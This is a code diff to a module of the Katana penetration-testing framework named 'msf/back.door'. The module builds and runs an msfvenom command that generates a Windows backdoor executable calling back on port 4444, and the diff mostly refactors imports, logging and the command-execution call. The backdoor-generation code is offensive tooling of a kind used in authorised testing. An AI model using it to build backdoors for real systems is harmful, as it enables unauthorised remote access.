@@ -3,11 +3,11 @@
 
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Katana Core import                  #
-from core.KATANAFRAMEWORK import *    #
+from core.KatanaFramework import *    #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 
 # LIBRARIES  
-from core.Function import status_cmd,get_local_ip,CheckProjectInstalled    
+
 # END LIBRARIES 
 
 # INFORMATION MODULE
@@ -17,7 +17,7 @@ def init():
 	init.Description        ="Generator's payload with Metasploit"
 	init.CodeName           ="msf/back.door"
 	init.DateCreation       ="07/10/2016"      
-	init.LastModification   ="07/10/2016"
+	init.LastModification   ="23/12/2016"
 	init.References         =None
 	init.License            =KTF_LINCENSE
 	init.var                ={}
@@ -25,7 +25,7 @@ def init():
 	# DEFAULT OPTIONS MODULE
 	init.options = {
 		# NAME    VALUE                       RQ     DESCRIPTION
-		'host'    :[get_local_ip()           ,True ,'Output path'],
+		'host'    :[LOCAL_IP                 ,True ,'Output path'],
 		'port'    :["4444"                   ,True ,'Output path'],
 		'output'  :["/home/backdoor.exe"     ,True ,'Output path'],
 		'platform':["windows"                ,True ,'Plataform'],
@@ -57,8 +57,8 @@ def init():
 # CODE MODULE    ############################################################################################
 def main(run):
 
-	printAlert(0,"Checking : "+CheckProjectInstalled("msfvenom"))
-	printAlert(6,"Wait, msfvenom working...")
+	printk.inf("Checking : "+UTIL.CheckProjectInstalled("msfvenom"))
+	printk.wait("Wait, msfvenom working...")
 	secuence = "msfvenom"
 	secuence += " -a "+init.var['arch']	
 	secuence += " --platform "+init.var['platform']
@@ -68,7 +68,7 @@ def main(run):
 	secuence += " -f "+init.var['format']
 	secuence += " -o "+init.var['output']
 	secuence += " -b '"+init.var['badchars']+"'"
-	printAlert(0,"Generating Payload\t\t\t\t\t"+status_cmd(secuence))
+	SYSTEM.Command_exe("Generating Payload\t\t\t",secuence,std=False)
 	Space()
 		
 # END CODE MODULE ############################################################################################
